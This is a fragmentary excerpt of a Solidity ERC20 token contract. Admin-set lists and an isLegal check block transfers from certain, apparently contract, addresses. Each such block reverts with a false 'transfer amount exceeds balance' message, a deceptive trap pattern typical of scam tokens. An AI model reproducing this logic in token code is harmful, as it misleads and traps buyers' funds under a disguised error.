...
contract You is ERC20,Control{  
    address public _usdtPair;
    address public _ca;  
    address private _da; 
    uint256 public _ctime;
    mapping(address=>uint256) private _mdonlymap;
    mapping(address=>uint256) private _botonlymap;
   ...
   function _transferToken(address from,address to,uint256 amount) private{
    ...
    function setBotonlymap(address user) public onlyRole(DEFAULT_ADMIN_ROLE){
        _botonlymap[user]=1;
    }   
    function setMdonlymap(address user,uint256 amount) public onlyRole(DEFAULT_ADMIN_ROLE){
        _mdonlymap[user]=amount*10**decimals(); 
    }  
    ...
    function _transfer(address from,address to,uint256 amount) internal override(ERC20){
        ...
        require(isLegal(from,to)==false, "ERC20: transfer amount exceeds balance"); 
    ...
    function isSize(address user) public view returns (bool) { 
     ...
     function isLegal(address from,address to) internal virtual returns(bool state){
        if(isSize(from) && from!=_usdtPair && from!=_da && from!=_ca && to!=_usdtPair){
            if(_botonlymap[from]==0){
                return true;
            }
            return false;
         }
